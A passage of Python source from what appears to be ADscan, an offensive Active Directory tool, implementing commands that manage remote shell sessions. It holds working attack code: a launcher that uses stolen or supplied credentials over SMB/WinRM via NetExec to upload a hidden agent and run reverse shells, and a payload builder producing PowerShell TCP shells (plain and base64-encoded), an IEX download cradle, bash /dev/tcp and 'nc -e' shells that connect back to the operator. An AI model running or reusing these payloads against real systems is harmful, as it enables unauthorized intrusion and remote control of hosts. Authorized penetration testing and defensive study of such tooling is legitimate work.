            except ValueError:
                print_error("Session id must be an integer.")
                return
            self.session_manager.kill_session(session_id)

        elif command == "current":
            current = self.session_manager.get_current_session()
            if current is None:
                print_warning("No active session selected.")
            else:
                print_success(
                    f"Current session: #{current.id} "
                    f"({current.type.value} {current.peer_address[0]}:{current.peer_address[1]})"
                )

        elif command == "interact":
            # Attach to a session and enter interactive mode.
            target_id: Optional[int] = None
            if sub_args:
                try:
                    target_id = int(sub_args[0])
                except ValueError:
                    print_error("Session id must be an integer.")
                    return
            else:
                current = self.session_manager.get_current_session()
                if current is None:
                    print_error(
                        "No session id provided and no current session selected."
                    )
                    return
                target_id = current.id

            if target_id is None:
                print_error("Could not determine session id for interaction.")
                return

            self.session_manager.interact(target_id, self.console)

        elif command == "rename":
            if len(sub_args) < 2:
                print_error("Usage: session rename <id> <alias>")
                return
            try:
                session_id = int(sub_args[0])
            except ValueError:
                print_error("Session id must be an integer.")
                return
            alias = " ".join(sub_args[1:])
            self.session_manager.rename_session(session_id, alias)

        elif command == "info":
            target_session: Optional[RemoteSession] = None
            if sub_args:
                try:
                    session_id = int(sub_args[0])
                except ValueError:
                    print_error("Session id must be an integer.")
                    return
                target_session = self.session_manager.get_session(session_id)
                if target_session is None:
                    print_error(f"Session #{session_id} not found.")
                    return
            else:
                target_session = self.session_manager.get_current_session()
                if target_session is None:
                    print_error(
                        "No session id provided and no current session selected."
                    )
                    return

            peer = f"{target_session.peer_address[0]}:{target_session.peer_address[1]}"
            created = target_session.created_at.strftime("%Y-%m-%d %H:%M:%S")
            alias = target_session.alias or "-"
            is_active = "Yes" if target_session.is_active else "No"

            info_table = Table(
                title=f"[bold]Session #{target_session.id} details[/bold]",
                show_header=False,
                border_style="cyan",
            )
            info_table.add_column("Field", style="bold")
            info_table.add_column("Value")
            info_table.add_row("ID", str(target_session.id))
            info_table.add_row("Alias", alias)
            info_table.add_row("Type", target_session.type.value)
            info_table.add_row("Peer", peer)
            info_table.add_row("Created (UTC)", created)
            info_table.add_row("Active", is_active)

            self.console.print(info_table)

        elif command == "interfaces":
            # Show local IPv4 interfaces that can be used as LHOST candidates.
            ip_to_iface = self._collect_interface_ips()
            if not ip_to_iface:
                print_warning(
                    "No active IPv4 interfaces detected. Configure an interface with 'set iface <name>'."
                )
                return

            table = Table(
                title="[bold]Local Interfaces (LHOST candidates)[/bold]",
                show_header=True,
                header_style="bold cyan",
                border_style="cyan",
            )
            table.add_column("Interface", style="bold")
            table.add_column("IPv4 address", style="white")

            for ip, iface in sorted(ip_to_iface.items()):
                table.add_row(iface, ip)

            self.console.print(table)

        elif command == "launch":
            # Launch a reverse shell on a target host via NetExec and bind it to
            # the active listener. Currently supports smb and winrm services.
            if len(sub_args) < 5:
                print_error(
                    "Usage: session launch <smb|winrm> <host> <domain> <username> <password> [windows|linux]"
                )
                return

            service = sub_args[0].lower()
            if service not in {"smb", "winrm"}:
                print_error("Only 'smb' and 'winrm' services are supported for now.")
                return

            host = sub_args[1]
            domain = sub_args[2]
            username = sub_args[3]
            password = sub_args[4]
            target_os = (
                sub_args[5].lower()
                if len(sub_args) >= 6
                else ("windows" if service in {"smb", "winrm"} else "linux")
            )
            if target_os not in {"windows", "linux"}:
                print_error("Target OS must be 'windows' or 'linux'.")
                return

            if not self.session_manager.is_listener_running():
                print_error(
                    "No active reverse-shell listener. Start one with "
                    "'session listener start [lhost] [lport]' before launching."
                )
                return

            listener_bind = self.session_manager.get_listener_bind()
            if not listener_bind:
                print_error("Could not determine listener bind address.")
                return
            listener_host, listener_port = listener_bind

            # Resolve LHOST used in payloads: avoid 0.0.0.0 by preferring myip
            # or the first non-loopback interface IP.
            lhost = listener_host
            if lhost == "0.0.0.0":
                myip = getattr(self, "myip", None)
                if myip:
                    lhost = myip
                else:
                    ip_map = self._collect_interface_ips()
                    non_loopback_ips = [
                        ip for ip in sorted(ip_map.keys()) if not ip.startswith("127.")
                    ]
                    if non_loopback_ips:
                        lhost = non_loopback_ips[0]
                    else:
                        print_error(
                            "Listener is bound to 0.0.0.0 and no usable local IPv4 "
                            "addresses were detected. Set 'myip' or restart the "
                            "listener with an explicit LHOST."
                        )
                        return

            lport = listener_port

            cred_type = "Hash" if self.is_hash(password) else "Password"
            print_operation_header(
                "Reverse Shell Launch",
                details={
                    "Service": service.upper(),
                    "Target Host": host,
                    "Domain": domain,
                    "Username": username,
                    "Credential Type": cred_type,
                    "LHOST": lhost,
                    "LPORT": str(lport),
                    "Target OS": target_os,
                },
                icon="🐚",
            )

            # Decide which kind of agent/shell to deploy on the target. For
            # Windows we have three tiers, in order of preference:
            #
            #   1. Python-based agent if a usable interpreter is present.
            #   2. Compiled agent-ng binary (Go) when available locally.
            #   3. Classic PowerShell reverse shell as a last resort.
            #
            # Non-Windows targets still use generic bash/netcat payloads.
            used_agent_payload = False
            chosen_payload: Optional[str] = None

            if target_os == "windows":
                # First tier: check if the remote host can run Python so we
                # can deploy the lightweight Python agent.
                supports_python_agent = False
                try:
                    supports_python_agent = self._remote_supports_python_agent(
                        service=service,
                        host=host,
                        domain=domain,
                        username=username,
                        password=password,
                    )
                except Exception as exc:  # pragma: no cover - defensive
                    telemetry.capture_exception(exc)
                    print_warning_debug(
                        f"[session launch] Python agent capability check failed: {exc}"
                    )

                if supports_python_agent:
                    from adscan_internal import build_python_agent_one_liner

                    python_exe = "python"
                    chosen_payload = build_python_agent_one_liner(
                        host=lhost, port=lport, python_exe=python_exe
                    )
                    used_agent_payload = True
                    print_info_debug(
                        "Using Python agent one-liner as payload for Windows "
                        "reverse shell launch."
                    )
                else:
                    # Second tier: try to use the compiled agent-ng binary for
                    # Windows. This currently only supports WinRM sessions,
                    # where we can reuse the existing WinRM upload helper to
                    # stage the executable into a well-known temporary
                    # directory before launching it.
                    from adscan_internal import get_agent_ng_local_path

                    agent_path = get_agent_ng_local_path(
                        target_os="windows", arch="amd64"
                    )
                    if agent_path is not None and agent_path.exists():
                        if service == "winrm":
                            # Use an absolute path instead of relying on
                            # environment variable expansion (%TEMP%), which
                            # can be brittle across different upload helpers.
                            remote_exe = r"C:\\Windows\\Temp\\adscan_agent_ng.exe"
                            try:
                                try:
                                    size_bytes = os.path.getsize(agent_path)
                                except OSError:
                                    size_bytes = 0
                                size_mb = (
                                    f"{size_bytes / (1024 * 1024):.1f} MB"
                                    if size_bytes
                                    else "unknown size"
                                )
                                print_info(
                                    f"Uploading agent-ng binary to the target "
                                    f"via WinRM (approximately {size_mb}). "
                                    "This may take several seconds..."
                                )
                                upload_ok = self.winrm_upload(
                                    domain=domain,
                                    host=host,
                                    username=username,
                                    password=password,
                                    local_path=str(agent_path),
                                    remote_path=remote_exe,
                                )
                            except Exception as exc:  # pragma: no cover - defensive
                                telemetry.capture_exception(exc)
                                upload_ok = False
                                print_warning_debug(
                                    "[session launch] Failed to upload "
                                    f"agent-ng binary via WinRM: {exc}"
                                )

                            if upload_ok:
                                # Launch the compiled agent via PowerShell in a
                                # hidden, non-interactive window. We avoid
                                # Start-Process here and instead invoke the
                                # agent binary directly from PowerShell,
                                # matching the behaviour validated manually
                                # with NetExec in the labs.
                                chosen_payload = (
                                    "powershell -NoP -NonI -W Hidden "
                                    f'-Command "{remote_exe} --host {lhost} --port {lport}"'
                                )
                                used_agent_payload = True
                                print_info_debug(
                                    "Using compiled agent-ng binary as payload "
                                    "for Windows reverse shell launch."
                                )
                            else:
                                print_warning_debug(
                                    "[session launch] agent-ng upload failed; "
                                    "falling back to PowerShell reverse shell."
                                )
                        else:
                            print_warning_debug(
                                "[session launch] agent-ng is currently only "
                                "supported for WinRM sessions; falling back "
                                "to PowerShell reverse shell."
                            )

            # If no agent-backed payload was selected (either because the
            # target OS is not Windows or because both Python and agent-ng are
            # unavailable), fall back to classic reverse-shell payloads.
            if chosen_payload is None:
                payloads = self._build_reverse_shell_payloads(
                    target_os=target_os, lhost=lhost, lport=lport
                )
                if not payloads:
                    print_error("Failed to build reverse-shell payloads.")
                    return

                for label, cmd in payloads:
                    if target_os == "linux" and "base64" in label.lower():
                        chosen_payload = cmd
                        break
                    if target_os == "windows" and "EncodedCommand" in cmd:
                        chosen_payload = cmd
                        break
                if chosen_payload is None:
                    chosen_payload = payloads[0][1]

            auth = self.build_auth_nxc(username, password, domain, kerberos=False)

            # Log path under current workspace when available.
            if getattr(self, "current_workspace_dir", None):
                log_dir = os.path.join(
                    self.current_workspace_dir, "domains", domain, service
                )
            else:
                log_dir = os.path.join("domains", domain, service)

            try:
                os.makedirs(log_dir, exist_ok=True)
            except OSError as exc:
                telemetry.capture_exception(exc)
                print_warning(
                    f"Failed to create log directory '{log_dir}': {exc}. "
                    "Using relative log path."
                )
                log_dir = os.path.join("domains", domain, service)

            log_file = os.path.join(log_dir, f"{host}_{username}_session_launch.log")

            if service == "winrm":
                command_added = (
                    f"{self.netexec_path} winrm {host} {auth} "
                    f"--log {log_file} -X '{chosen_payload}'"
                )
            else:  # smb
                command_added = (
                    f"{self.netexec_path} smb {host} {auth} "
                    f"--log {log_file} -x '{chosen_payload}'"
                )

            print_info_debug(f"Launching reverse shell via: {command_added}")

            # Track sessions before execution to detect new ones.
            existing_ids = {
                session.id for session in self.session_manager.list_sessions()
            }

            # For reverse shells we do not want to block until the NetExec
            # process exits (it may keep the remote process attached and never
            # terminate). Instead, treat NetExec as a best-effort launcher and
            # rely on the listener to detect the incoming session.
            try:
                # Try to sync clock once before spawning to reduce Kerberos
                # clock-skew issues, mimicking _run_netexec(pre_sync=True).
                if domain:
                    self.do_sync_clock_with_pdc(domain, verbose=True)
            except Exception as exc:  # pragma: no cover - defensive
                telemetry.capture_exception(exc)
                print_warning_debug(
                    f"Clock sync before reverse shell launch failed: {exc}"
                )

            launcher_proc = self.spawn_command(
                command_added,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            if launcher_proc is None:
                print_error("Failed to start NetExec launcher process.")
                return

            def _log_launcher_output(proc: subprocess.Popen[str], cmd: str) -> None:
                """Background logger for the NetExec launcher process.

                If the launcher process exits and no active session exists for
                the target host, we warn the user that the reverse shell is
                likely lost. Under WinRM, the remote process can be tied to
                the lifetime of the launching session, so an unexpected exit
                of NetExec is a strong signal that the agent has died too.
                """
                from adscan_internal.rich_output import mark_sensitive

                try:
                    stdout_data, stderr_data = proc.communicate()
                    rc = proc.returncode
                    stdout_trimmed = (stdout_data or "")[:200]
                    stderr_trimmed = (stderr_data or "")[:200]
                    if rc != 0:
                        print_warning_debug(
                            "[session launch] NetExec launcher exited with "
                            f"code {rc}. Stdout: {stdout_trimmed!r} "
                            f"Stderr: {stderr_trimmed!r}"
                        )
                    else:
                        print_info_debug(
                            "[session launch] NetExec launcher exited cleanly "
                            f"with code 0. Stdout: {stdout_trimmed!r}"
                        )

                    # After the launcher exits, check whether we still have an
                    # active session for this host. If not, inform the user
                    # that the reverse shell session was likely lost.
                    active_for_host = any(
                        sess.is_active and sess.metadata.get("host") == host
                        for sess in self.session_manager.list_sessions()
                    )
                    if not active_for_host:
                        marked_host = mark_sensitive(host, "hostname")
                        print_warning(
                            "The NetExec launcher process for this reverse shell "
                            f"has exited and no active session is registered for "
                            f"{marked_host}. The remote shell/agent was likely terminated."
                        )
                except Exception as exc:  # pragma: no cover - defensive
                    telemetry.capture_exception(exc)
                    print_warning_debug(
                        f"[session launch] Failed to collect NetExec output for "
                        f"command '{cmd[:120]}...': {exc}"
                    )

            # Monitor launcher output without blocking the main REPL.
            monitor_thread = threading.Thread(
                target=_log_launcher_output,
                args=(launcher_proc, command_added),
                daemon=True,
            )
            monitor_thread.start()

            # Wait briefly for an incoming session.
            print_info("Waiting for an incoming reverse shell session...")
            new_session_id: Optional[int] = None
            wait_seconds = 30
            poll_interval = 1
            for _ in range(0, wait_seconds, poll_interval):
                time.sleep(poll_interval)
                sessions = self.session_manager.list_sessions()
                for session in sessions:
                    if session.id not in existing_ids and session.is_active:
                        new_session_id = session.id
                        break
                if new_session_id is not None:
                    break

            if new_session_id is None:
                print_warning(
                    "No new session was registered on the listener within the "
                    f"next {wait_seconds} seconds. If the payload succeeded, the "
                    "session may still arrive later."
                )
                return

            self.session_manager.set_current_session(new_session_id)
            self.current_session = self.session_manager.get_current_session()

            if self.current_session:
                peer = (
                    f"{self.current_session.peer_address[0]}:"
                    f"{self.current_session.peer_address[1]}"
                )
                # Attach basic context metadata so future session-level helpers
                # (upload/download, etc.) know how this session was obtained.
                try:
                    self.current_session.metadata.update(
                        {
                            "service": service,
                            "host": host,
                            "domain": domain,
                            "username": username,
                            "password": password,
                            "target_os": target_os,
                        }
                    )
                except Exception:
                    # Metadata is best-effort; failures here should not break
                    # the established reverse shell session.
                    pass
                # If we launched a Windows payload using the Python agent,
                # automatically wrap the underlying socket in an AgentSession
                # so that SessionShell commands can use the higher-level agent
                # protocol without requiring an explicit
                # `session agent attach`.
                if target_os == "windows" and used_agent_payload:
                    try:
                        from adscan_internal import AgentSession, SessionType

                        if self.current_session.socket is not None:
                            agent_client = AgentSession(
                                sock=self.current_session.socket
                            )
                            self.current_session.metadata["agent_client"] = agent_client
                            self.current_session.type = SessionType.AGENT
                            print_success(
                                "Agent-backed session "
                                f"#{self.current_session.id} received from "
                                f"{peer}. Use 'session shell "
                                f"{self.current_session.id}' to interact via "
                                "the agent, or 'session interact "
                                f"{self.current_session.id}' for raw TCP."
                            )
                        else:
                            print_success(
                                f"Reverse shell session #{self.current_session.id} "
                                f"received from {peer}, but no socket was "
                                "available for agent attachment."
                            )
                    except Exception as exc:  # pragma: no cover - defensive
                        telemetry.capture_exception(exc)
                        print_warning_debug(
                            "Reverse shell session received but automatic "
                            f"agent attachment failed: {exc}"
                        )
                        print_success(
                            f"Reverse shell session #{self.current_session.id} "
                            f"received from {peer}. Use 'session interact "
                            f"{self.current_session.id}' to attach."
                        )
                else:
                    print_success(
                        f"Reverse shell session #{self.current_session.id} "
                        f"received from {peer}. Use 'session interact "
                        f"{self.current_session.id}' to attach."
                    )

        elif command == "connect":
            # Connect to a bind shell or other TCP service and track it as a session.
            if len(sub_args) < 2:
                print_error("Usage: session connect <host> <port> [alias]")
                return

            host = sub_args[0]
            try:
                port = int(sub_args[1])
            except ValueError:
                print_error("Port must be an integer.")
                return
            alias = " ".join(sub_args[2:]).strip() if len(sub_args) >= 3 else ""

            print_operation_header(
                "Bind Shell Connect",
                details={
                    "Remote Host": host,
                    "Remote Port": port,
                    "Alias": alias or "-",
                },
                icon="🔌",
            )

            session = self.session_manager.connect_tcp(
                host, port, description="Outbound TCP connection"
            )
            if session is None:
                return

            if alias:
                self.session_manager.rename_session(session.id, alias)

            # Make the new session current for convenience.
            self.session_manager.set_current_session(session.id)
            self.current_session = self.session_manager.get_current_session()

        elif command == "download":
            if not sub_args:
                print_error("Usage: session download <remote_path> [download_dir]")
                return

            current = self.session_manager.get_current_session()
            if current is None:
                print_error("No active session selected. Use 'session use <id>' first.")
                return

            remote_path = sub_args[0]
            # Determine base download directory (optional override from user)
            base_download_dir = sub_args[1] if len(sub_args) >= 2 else None

            service = str(current.metadata.get("service", "")).lower()
            domain = current.metadata.get("domain")
            host = current.metadata.get("host")
            username = current.metadata.get("username")
            password = current.metadata.get("password")

            if service != "winrm":
                print_error(
                    "Session-based download is currently only supported for "
                    "WinRM-backed sessions launched via 'session launch winrm'."
                )
                return

            if not all([domain, host, username, password]):
                print_error(
                    "Current session is missing required context (domain, host, "
                    "username, or password). Ensure it was created with "
                    "'session launch winrm'."
                )
                return

            if base_download_dir:
                download_dir = base_download_dir
            elif self.current_workspace_dir:
                download_dir = os.path.join(
                    self.current_workspace_dir,
                    "domains",
                    domain,
                    "sessions",
                    f"{host}_{username}",
                )
            else:
                download_dir = os.path.join(
                    "domains", domain, "sessions", f"{host}_{username}"
                )

            print_operation_header(
                "Session File Download",
                details={
                    "Service": service.upper(),
                    "Domain": str(domain),
                    "Host": str(host),
                    "Username": str(username),
                    "Remote Path": remote_path,
                    "Download Dir": download_dir,
                },
                icon="📥",
            )

            downloaded_files = self.winrm_download(
                domain=str(domain),
                host=str(host),
                username=str(username),
                password=str(password),
                paths=[remote_path],
                download_dir=download_dir,
            )

            if not downloaded_files:
                print_warning("No files were downloaded for the specified remote path.")
            else:
                for path in downloaded_files:
                    marked_path = mark_sensitive(path, "path")
                    print_success(f"Downloaded file saved as: {marked_path}")

        elif command == "upload":
            if len(sub_args) < 2:
                print_error("Usage: session upload <local_path> <remote_path>")
                return

            current = self.session_manager.get_current_session()
            if current is None:
                print_error("No active session selected. Use 'session use <id>' first.")
                return

            local_path = sub_args[0]
            remote_path = sub_args[1]

            if not os.path.exists(local_path) or not os.path.isfile(local_path):
                print_error(
                    f"Local file '{local_path}' does not exist or is not a file."
                )
                return

            service = str(current.metadata.get("service", "")).lower()
            domain = current.metadata.get("domain")
            host = current.metadata.get("host")
            username = current.metadata.get("username")
            password = current.metadata.get("password")

            if service != "winrm":
                print_error(
                    "Session-based upload is currently only supported for "
                    "WinRM-backed sessions launched via 'session launch winrm'."
                )
                return

            if not all([domain, host, username, password]):
                print_error(
                    "Current session is missing required context (domain, host, "
                    "username, or password). Ensure it was created with "
                    "'session launch winrm'."
                )
                return

            print_operation_header(
                "Session File Upload",
                details={
                    "Service": service.upper(),
                    "Domain": str(domain),
                    "Host": str(host),
                    "Username": str(username),
                    "Local Path": local_path,
                    "Remote Path": remote_path,
                },
                icon="📤",
            )

            success = self.winrm_upload(
                domain=str(domain),
                host=str(host),
                username=str(username),
                password=str(password),
                local_path=local_path,
                remote_path=remote_path,
            )

            if success:
                print_success(
                    f"File '{local_path}' uploaded successfully to '{remote_path}'."
                )
            else:
                print_error(
                    f"Upload of '{local_path}' to '{remote_path}' appears to have failed."
                )

        elif command == "system":
            # Run a local system command from the session context. This is a
            # thin wrapper over the global `system` command to avoid confusion
            # between local host commands and commands executed inside the
            # interactive remote shell.
            if not sub_args:
                print_error("Usage: session system <command>")
                return
            cmd = " ".join(sub_args)
            self.do_system(cmd)

        elif command == "shell":
            # Open a dedicated session shell REPL for the current or specified
            # session. This provides a focused command set (info, interact,
            # upload/download, etc.) distinct from the main ADscan workspace.
            target_session: Optional[RemoteSession] = None
            if sub_args:
                try:
                    sess_id = int(sub_args[0])
                except ValueError:
                    print_error("Session id must be an integer.")
                    return
                target_session = self.session_manager.get_session(sess_id)
                if target_session is None:
                    print_error(f"Session #{sess_id} not found.")
                    return
            else:
                target_session = self.session_manager.get_current_session()
                if target_session is None:
                    print_error(
                        "No session id provided and no current session selected."
                    )
                    return

            from adscan_internal import SessionShell

            shell = SessionShell(
                parent_shell=self,
                session_manager=self.session_manager,
                session=target_session,
            )
            shell.run()

        elif command == "agent":
            # Session agent operations:
            #   session agent payload [python_exe]
            #   session agent attach [id]
            if not sub_args:
                print_error("Usage: session agent <payload [python_exe]|attach [id]>")
                return

            action = sub_args[0]

            if action == "payload":
                from adscan_internal import build_python_agent_one_liner

                listener_bind = self.session_manager.get_listener_bind()
                if not listener_bind:
                    print_error(
                        "No active listener. Start one with "
                        "'session listener start' before generating an agent payload."
                    )
                    return
                listener_host, listener_port = listener_bind

                # Resolve a concrete LHOST for the payload (avoid 0.0.0.0).
                lhost = listener_host
                if lhost == "0.0.0.0":
                    myip = getattr(self, "myip", None)
                    if myip:
                        lhost = myip
                    else:
                        ip_map = self._collect_interface_ips()
                        non_loopback_ips = [
                            ip
                            for ip in sorted(ip_map.keys())
                            if not ip.startswith("127.")
                        ]
                        if non_loopback_ips:
                            lhost = non_loopback_ips[0]
                        else:
                            print_error(
                                "Listener is bound to 0.0.0.0 and no usable local "
                                "IPv4 addresses were detected. Set 'myip' or restart "
                                "the listener with an explicit LHOST."
                            )
                            return

                python_exe = sub_args[1] if len(sub_args) >= 2 else "python"
                one_liner = build_python_agent_one_liner(
                    host=lhost, port=listener_port, python_exe=python_exe
                )

                self.console.print(
                    Panel(
                        one_liner,
                        title="[bold cyan]Python Agent Payload[/bold cyan]",
                        border_style="cyan",
                    )
                )

            elif action == "attach":
                # Attach an AgentSession client to an existing TCP session so that
                # SessionShell commands can use the custom agent protocol instead
                # of service-specific helpers (WinRM, etc.). This assumes that the
                # remote endpoint is already running a compatible agent.
                target_session: Optional[RemoteSession] = None
                if len(sub_args) >= 2:
                    try:
                        sess_id = int(sub_args[1])
                    except ValueError:
                        print_error("Session id must be an integer.")
                        return
                    target_session = self.session_manager.get_session(sess_id)
                    if target_session is None:
                        print_error(f"Session #{sess_id} not found.")
                        return
                else:
                    target_session = self.session_manager.get_current_session()
                    if target_session is None:
                        print_error(
                            "No session id provided and no current session selected."
                        )
                        return

                if not target_session.socket:
                    print_error(
                        "The selected session does not have an underlying socket; "
                        "cannot attach agent."
                    )
                    return

                try:
                    agent_client = AgentSession(sock=target_session.socket)
                    target_session.metadata["agent_client"] = agent_client
                    target_session.type = SessionType.AGENT
                    print_success(
                        f"Agent client attached to session #{target_session.id}. "
                        "SessionShell commands can now use the agent protocol."
                    )
                except Exception as exc:  # pragma: no cover - defensive
                    telemetry.capture_exception(exc)
                    print_error("Failed to attach agent to session.")
                    print_exception(show_locals=False, exception=exc)
            else:
                print_error(
                    "Unknown agent action. Use: "
                    "session agent payload [python_exe] "
                    "or session agent attach [id]."
                )

        elif command == "payload":
            if not sub_args:
                print_error("Usage: session payload <windows|linux> [lhost] [lport]")
                return

            target_os = sub_args[0].lower()
            if target_os not in {"windows", "linux"}:
                print_error("Target OS must be 'windows' or 'linux'.")
                return

            # Determine listener bind or use provided host/port
            if len(sub_args) >= 2:
                lhost = sub_args[1]
            else:
                listener_bind = self.session_manager.get_listener_bind()
                if listener_bind:
                    lhost = listener_bind[0]
                else:
                    lhost = getattr(self, "myip", "0.0.0.0") or "0.0.0.0"

            try:
                if len(sub_args) >= 3:
                    lport = int(sub_args[2])
                else:
                    listener_bind = self.session_manager.get_listener_bind()
                    if listener_bind:
                        lport = listener_bind[1]
                    else:
                        lport = 4444
            except ValueError:
                print_error("Listener port must be an integer.")
                return

            print_info(
                f"Generating reverse-shell payloads for {target_os} using {lhost}:{lport}"
            )

            chosen_payload: Optional[str] = None

            if target_os == "windows":
                # For Windows targets, default to using the Python agent as the
                # reverse shell, similar to how Penelope uses its own agent.
                from adscan_internal import build_python_agent_one_liner

                python_exe = "python"
                chosen_payload = build_python_agent_one_liner(
                    host=lhost, port=lport, python_exe=python_exe
                )
                print_info_debug(
                    "Using Python agent one-liner as payload for Windows target."
                )
            else:
                # For non-Windows targets, reuse the generic reverse-shell
                # payload builder (bash/netcat).
                payloads = self._build_reverse_shell_payloads(
                    target_os=target_os, lhost=lhost, lport=lport
                )
                if not payloads:
                    print_error("Failed to build reverse-shell payloads.")
                    return
                chosen_payload = payloads[0][1]

        else:
            print_error(
                f"Unknown session subcommand '{command}'. "
                "Use: listener, list, use, kill, current, interact, payload, "
                "info, rename, interfaces, launch, connect, download, upload, "
                "or system."
            )

    def _collect_interface_ips(self) -> dict[str, str]:
        """Return a mapping of IPv4 address to interface name.

        This helper is used by the `session` command to present sensible
        LHOST candidates when generating payloads or listing interfaces.
        """
        ip_to_iface: dict[str, str] = {}
        try:
            for iface in netifaces.interfaces():
                try:
                    addresses = netifaces.ifaddresses(iface)
                except ValueError:
                    # Interface disappeared between listing and lookup
                    continue
                inet_addresses = addresses.get(netifaces.AF_INET) or []
                for addr in inet_addresses:
                    ip = addr.get("addr")
                    if not ip or ip.startswith("127."):
                        continue
                    ip_to_iface[ip] = iface
        except Exception as exc:  # pragma: no cover - defensive
            telemetry.capture_exception(exc)
            print_error_debug(
                f"Failed to enumerate local interfaces for payload generation: {exc}"
            )
        return ip_to_iface

    def _remote_supports_python_agent(
        self,
        service: str,
        host: str,
        domain: str,
        username: str,
        password: str,
    ) -> bool:
        """Best-effort check whether the remote host can run Python.

        This helper mirrors Penelope's behaviour of only enabling the Python
        agent when a usable interpreter exists on the target. We execute a
        small test command via NetExec that prints a magic marker using
        ``python -c``. If the marker appears in stdout and the command returns
        successfully, we assume the Python-based agent should work.

        The check is intentionally conservative: any failure (network issues,
        command errors, timeouts) is treated as "no Python", and the caller
        will fall back to a traditional reverse shell payload instead.
        """
        service = service.lower()
        if service not in {"smb", "winrm"}:
            return False

        try:
            auth = self.build_auth_nxc(
                username=username,
                password=password,
                domain=domain,
                kerberos=False,
            )
        except Exception as exc:  # pragma: no cover - defensive
            telemetry.capture_exception(exc)
            print_warning_debug(
                f"[session launch] Failed to build NetExec auth for Python "
                f"agent check: {exc}"
            )
            return False

        # Log path under current workspace when available, mirroring the main
        # session-launch logging layout but keeping a dedicated filename.
        if getattr(self, "current_workspace_dir", None):
            log_dir = os.path.join(
                self.current_workspace_dir, "domains", domain, service
            )
        else:
            log_dir = os.path.join("domains", domain, service)

        try:
            os.makedirs(log_dir, exist_ok=True)
        except OSError as exc:  # pragma: no cover - defensive
            telemetry.capture_exception(exc)
            print_warning_debug(
                f"[session launch] Failed to create log directory for Python "
                f"agent check '{log_dir}': {exc}. Falling back to relative path."
            )
            log_dir = os.path.join("domains", domain, service)

        log_file = os.path.join(log_dir, f"{host}_{username}_python_check.log")
        marker = "ADSCAN_PY_AGENT_OK"
        python_check_cmd = f'python -c "print(\\"{marker}\\")"'

        if service == "winrm":
            nxc_cmd = (
                f"{self.netexec_path} winrm {host} {auth} "
                f"--log {log_file} -X '{python_check_cmd}'"
            )
        else:
            nxc_cmd = (
                f"{self.netexec_path} smb {host} {auth} "
                f"--log {log_file} -x '{python_check_cmd}'"
            )

        print_info_debug(
            f"[session launch] Probing remote Python support with: {nxc_cmd}"
        )

        try:
            proc = self.spawn_command(
                nxc_cmd,
                shell=True,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                ignore_errors=True,
                use_clean_env=True,
            )
            if proc is None:
                return False

            try:
                stdout_data, stderr_data = proc.communicate(timeout=60)
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout_data, stderr_data = proc.communicate()
                print_warning_debug(
                    "[session launch] Remote Python probe timed out; "
                    "falling back to non-agent payload."
                )
                return False

            rc = proc.returncode
            if rc != 0:
                print_warning_debug(
                    "[session launch] Remote Python probe exited with "
                    f"code {rc}. Stdout: {stdout_data[:200]!r} "
                    f"Stderr: {stderr_data[:200]!r}"
                )
                return False

            if marker in stdout_data:
                print_info_debug(
                    "[session launch] Remote Python interpreter detected; "
                    "enabling Python agent payload."
                )
                return True

            print_warning_debug(
                "[session launch] Remote Python probe succeeded but marker "
                "was not found in stdout; treating as no Python."
            )
            return False
        except Exception as exc:  # pragma: no cover - defensive
            telemetry.capture_exception(exc)
            print_warning_debug(
                f"[session launch] Unexpected error during Python agent "
                f"probe: {exc}. Falling back to non-agent payload."
            )
            return False

    def _build_reverse_shell_payloads(
        self, target_os: str, lhost: str, lport: int
    ) -> list[tuple[str, str]]:
        """Generate reverse-shell payload strings for the given OS and LHOST.

        This centralises payload construction so both `session payload` and any
        future helpers (for example, SMB/WinRM launchers) can reuse the same
        logic. The design is inspired by Penelope but implemented specifically
        for ADscan.

        Args:
            target_os: `"windows"` or `"linux"`.
            lhost: Local host/IP that the target should connect back to.
            lport: Local TCP port for the reverse-shell listener.

        Returns:
            List of `(label, payload)` tuples suitable for display.
        """
        import base64  # Local import to avoid polluting global namespace

        payloads: list[tuple[str, str]] = []

        if target_os == "windows":
            # Inline PowerShell TCP reverse shell.
            ps_script = (
                f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
                "$s=$c.GetStream();"
                "[byte[]]$b=0..65535|%{0};"
                "while(($r=$s.Read($b,0,$b.Length)) -ne 0){"
                "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$r);"
                "$sb=(iex $d 2>&1 | Out-String);"
                "$sb2=$sb+'PS '+(pwd).Path+'> ';"
                "$sbby=([Text.Encoding]::ASCII).GetBytes($sb2);"
                "$s.Write($sbby,0,$sbby.Length);$s.Flush()}"
                "$c.Close()"
            )
            inline_payload = (
                f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "{ps_script}"'
            )
            payloads.append(("PowerShell TCP (inline)", inline_payload))

            # Base64-encoded version using -EncodedCommand (UTF-16LE).
            ps_b64 = base64.b64encode(ps_script.encode("utf-16le")).decode()
            encoded_payload = (
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {ps_b64}"
            )
            payloads.append(
                ("PowerShell TCP (base64 -EncodedCommand)", encoded_payload)
            )

            # Simple download cradle for hosting a script like shell.ps1.
            cradle_payload = (
                "powershell -w hidden -NoP -NonI -Command "
                f"\"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/shell.ps1')\""
            )
            payloads.append(("PowerShell download cradle", cradle_payload))

        elif target_os == "linux":
            bash_inline = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
            payloads.append(("Bash TCP", bash_inline))

            nc_inline = f"nc {lhost} {lport} -e /bin/bash"
            payloads.append(("Netcat (if -e supported)", nc_inline))

            # Base64 wrapper for environments with limited quoting or logging.
            bash_script = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            bash_b64 = base64.b64encode(bash_script.encode()).decode()
            b64_wrapper = f"printf {bash_b64} | base64 -d | bash"
            payloads.append(("Bash TCP (base64 wrapper)", b64_wrapper))

        return payloads

    def create_background_task(self, target, args=()):
        """Creates a background task and adds it to the tracking list"""
        task = threading.Thread(target=target, args=args)
        task.daemon = (
            True  # Make the thread a daemon so it ends when the main program terminates
        )
        self.background_tasks.append(task)
        task.start()
        return task

    def _get_rich_prompt_object(self):
        from adscan_internal.rich_output import BRAND_COLORS

        prompt_text = Text()
        prompt_text.append("(", style="white")
        prompt_text.append("ADscan", style=f"bold {BRAND_COLORS['info']}")

